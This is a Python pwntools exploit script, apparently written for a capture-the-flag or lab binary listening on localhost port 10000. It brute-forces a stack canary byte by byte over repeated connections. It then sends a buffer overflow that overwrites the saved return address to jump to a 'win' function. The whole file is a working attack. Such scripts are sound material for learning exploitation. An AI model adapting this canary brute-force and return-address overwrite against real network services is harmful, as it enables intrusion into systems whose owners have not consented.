import sys
import struct
from pwn import *

#Please launch with "python3 exploit_canary_2.py SILENT=1" to avoid being bothered by connection info

offset_to_canary = 504
no_bytes = offset_to_canary + 8 + 8 + 8 # we want to fill the buffer and align, write the canary, write rbp, write the saved return address
canary = b"" # LSB of canary is always a NULL 
rbp = b"Z"*8
win = 0x0000000000401256

for k in range(0,8):
    print(canary.hex())
    for i in range (0,256):
        # first we have to send len 
        len = struct.pack("I", offset_to_canary + 8)
        conn = remote("localhost", 10000)
        conn.send(len)

        # then bruteforcing canary 
        payload = b"A"*offset_to_canary
        attempt_canary = canary + struct.pack("B", i)
        payload += attempt_canary
        conn.send(payload)
        try:
            conn.recvuntil("terminated") # if program is terminated means that we have to try another value for the byte
            continue
        except:
            canary = attempt_canary # otherwise we have found the right byte, go on with the next one
            break
        finally:
            conn.close() # by closing the connection we can let the read return 

# print("Canary is {}".format(hex(int(canary, base=16))))
print(canary.hex())
print("Sending payload ...")
last_conn = remote("localhost", 10000)
len = struct.pack("I", no_bytes)
last_conn.send(len)
buf = b"A"*offset_to_canary + canary + b"Z"*8 + p64(win)
last_conn.send(buf)
print(last_conn.recvall())